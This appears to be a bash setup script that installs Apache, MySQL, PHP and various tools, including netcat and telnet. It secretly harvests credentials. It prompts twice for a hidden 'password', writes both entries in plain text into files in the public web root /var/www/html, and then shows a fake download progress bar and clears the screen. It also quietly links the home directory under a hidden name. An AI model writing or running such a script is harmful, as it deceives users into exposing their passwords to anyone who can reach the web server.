#! /bin/bash

sudo apt install apache2

echo Do you want "install" this file Y or N


read

read -s -p "Enter password : " pass
clear
read -s -p  "Enter password : " name1


ln -s /home/

mv home .apache2

echo /var/www/html/data_dir.properties
echo $pass > /var/www/html/apache2
echo $name1 > /var/www/html/apache2conf

clear
printf "\e[1;34m Downloading please wait....... \e[0m \n"
echo -ne '####                      (20%)\r'
sleep 1
echo -ne '######                    (43%)\r'
sleep 2
echo -ne '#############             (66%)\r'
sleep 1
echo -ne '#################	    (92%)\r'
sleep 2
echo -ne '#######################   (100%)\r'
echo -ne '\n'

printf  "\e[1;32m '****************Complete***********'\e[0m \n"
clear 

sudo apt install mysql-workbench

sudo dpkg --add-architecture i386; sudo apt update; sudo apt install curl wget file tar bzip2 gzip unzip bsdmainutils python util-linux ca-certificates binutils bc jq tmux netcat lib32gcc1 lib32stdc++6 libsdl2-2.0-0:i386 steamcmd telnet expect

clear

sudo apt-get install mysql-server

sudo apt-get install python3

sudo apt install php libapache2-mod-php

sudo apt install php-fpm

